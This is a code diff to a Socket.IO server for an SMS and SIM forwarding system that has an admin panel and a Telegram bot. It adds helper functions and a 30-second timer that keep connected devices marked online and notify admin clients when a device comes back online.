@@ -3,7 +3,42 @@ import { store } from '../store.js';
 import { SMS, ForwardingConfig, SimInfo } from '../types/index.js';
 import { TelegramBotService } from '../telegram/bot.js';
 
+/**
+ * Mark a device online from any authenticated socket event and remember which
+ * device this socket belongs to. Emits devices:update only on an offline→online
+ * transition so the admin panel self-heals without being spammed.
+ */
+function markDeviceOnline(io: Server, socket: Socket, deviceId: string): void {
+    socket.data.deviceId = deviceId;
+    if (store.touchDevice(deviceId, socket.id)) {
+        io.to('admin').emit('devices:update', store.getAllDevices());
+    }
+}
+
+/**
+ * Reconcile presence: any device that currently has a live socket is (re)marked
+ * online. This never marks a device offline, so it is safe to run periodically
+ * and directly fixes "connected but shown offline" staleness.
+ */
+function reconcilePresence(io: Server): void {
+    let changed = false;
+    for (const s of io.sockets.sockets.values()) {
+        const deviceId = s.data?.deviceId as string | undefined;
+        if (deviceId && store.touchDevice(deviceId, s.id)) {
+            changed = true;
+        }
+    }
+    if (changed) {
+        io.to('admin').emit('devices:update', store.getAllDevices());
+    }
+}
+
 export function setupSocketHandlers(io: Server, telegramBot?: TelegramBotService): void {
+
+    // Periodic presence reconciliation (never marks offline, only heals online).
+    const reconcileTimer = setInterval(() => reconcilePresence(io), 30000);
+    reconcileTimer.unref?.();
+
     io.on('connection', (socket: Socket) => {
         console.log(`[Socket] Client connected: ${socket.id}`);
 
@@ -20,6 +55,7 @@ export function setupSocketHandlers(io: Server, telegramBot?: TelegramBotService
 
             // Join device to its own room
             socket.join(`device:${data.id}`);
+            socket.data.deviceId = data.id;
 
             // Notify admin panels of device update
             io.to('admin').emit('devices:update', store.getAllDevices());
@@ -38,7 +74,7 @@ export function setupSocketHandlers(io: Server, telegramBot?: TelegramBotService
         // App-level heartbeat — keeps the device marked online between syncs
         socket.on('device:heartbeat', (data: { deviceId: string }) => {
             if (!data?.deviceId) return;
-            store.touchDevice(data.deviceId, socket.id);
+            markDeviceOnline(io, socket, data.deviceId);
         });
 
         // Device requests its current forwarding config (e.g., after reconnection)
@@ -64,7 +100,7 @@ export function setupSocketHandlers(io: Server, telegramBot?: TelegramBotService
             store.syncSMS(data.deviceId, data.sms);
 
             // Any authenticated traffic proves the device is alive — heal presence.
-            store.touchDevice(data.deviceId, socket.id);
+            markDeviceOnline(io, socket, data.deviceId);
 
             // Notify admin panels
             io.to('admin').emit('sms:update', {
@@ -145,7 +181,7 @@ export function setupSocketHandlers(io: Server, telegramBot?: TelegramBotService
             console.log(`[Socket] SIM sync from device ${data.deviceId}: ${data.simCards.length} SIMs`);
 
             store.syncSimCards(data.deviceId, data.simCards);
-            store.touchDevice(data.deviceId, socket.id);
+            markDeviceOnline(io, socket, data.deviceId);
 
             // Send acknowledgment back to device
             socket.emit('sim:sync:ack', { deviceId: data.deviceId, success: true, count: data.simCards.length });
@@ -162,6 +198,9 @@ export function setupSocketHandlers(io: Server, telegramBot?: TelegramBotService
         socket.on('admin:connect', () => {
             console.log(`[Socket] Admin panel connected: ${socket.id}`);
             socket.join('admin');
+
+            // Reconcile any stale "offline" state before sending the device list.
+            reconcilePresence(io);
 
             // Send current device list
             socket.emit('devices:update', store.getAllDevices());
